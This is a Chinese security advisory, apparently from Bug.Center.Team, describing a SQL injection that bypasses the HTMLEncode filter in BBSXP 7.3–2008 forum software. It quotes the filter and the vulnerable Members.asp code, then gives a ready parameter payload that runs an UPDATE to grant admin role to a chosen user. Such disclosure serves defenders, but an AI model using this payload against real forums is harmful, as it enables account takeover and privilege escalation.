@@ -1,0 +1,59 @@
+BBSxp HTMLEncode过滤函数过滤不严导致绕过漏洞
+
+漏洞版本:
+
+BBSXP 7.3-BBSXP2008 sql
+漏洞描述:
+
+BBSXP为一款简单的ASP+SQL与ACCESS开发的多风格论坛 目前最新版本为BBSXP2008。
+官方最新过滤函数HTMLEncode,这次过滤了字符* ,再一次绕过过滤注射
+Function HTMLEncode(fString)
+fString=Replace(fString,CHR(9),"")
+fString=Replace(fString,CHR(13),"")
+fString=Replace(fString,CHR(22),"")
+fString=Replace(fString,CHR(38),"&") '“&”
+fString=Replace(fString,CHR(32)," ") '“ ”
+fString=Replace(fString,CHR(34),""") '“"”
+fString=Replace(fString,CHR(39),"'") '“'”
+fString=Replace(fString,CHR(42),"*") '“*”
+fString=Replace(fString,CHR(44),",") '“,”
+fString=Replace(fString,CHR(45)&CHR(45),"--") '“–”
+fString=Replace(fString,CHR(60),"<") '“<”
+fString=Replace(fString,CHR(62),">") '“>”
+fString=Replace(fString,CHR(92),"\") '“\”
+fString=Replace(fString,CHR(59),";") '“;”
+fString=Replace(fString,CHR(10),"<br>")
+fString=ReplaceText(fString,"([&#])([a-z0-9]*);","$1$2;")
+if SiteConfig("BannedText")<>"" then fString=ReplaceText(fString,"("&SiteConfig("BannedText")&")",string(len("&$1&"),"*"))
+if IsSqlDataBase=0 then '过滤片假名(日文字符)[\u30A0-\u30FF] by yuzi
+fString=escape(fString)
+fString=ReplaceText(fString,"%u30([A-F][0-F])","0$1;")
+fString=unescape(fString)
+end if
+HTMLEncode=fString
+End Function
+Members.asp漏洞文件作为测试:
+SearchType=HTMLEncode(Request("SearchType")) //第8行
+SearchText=HTMLEncode(Request("SearchText"))
+SearchRole=RequestInt("SearchRole")
+CurrentAccountStatus=HTMLEncode(Request("CurrentAccountStatus"))
+……
+if SearchText<>"" then item=item&" and ("&SearchType&" like '%"&SearchText&"%')" //第18行
+……
+if CurrentAccountStatus <> "" then item=item&" and UserAccountStatus="&CurrentAccountStatus&"" //第22行
+
+if item<>"" then item=" where "&mid(item,5)
+……
+TotalCount=Execute("Select count(UserID) From ["&TablePrefix&"Users]"&item)(0) '获取数据数量
+//第54行
+
+看个sql语句：
+select * from bbsxp_users where userid=(1)update[bbsxp_users]set[userroleid]=(1)where(username=0×79006C003600330036003400)
+变量userid绕过过滤成功执行了update
+同理构造:
+SearchType=1
+SearchText=1
+CurrentAccountStatus=(1)update[bbsxp_users]set[userroleid]=(1)where(username=0×79006C003600330036003400)
+<* 参考
+ Bug.Center.Team
+ *>
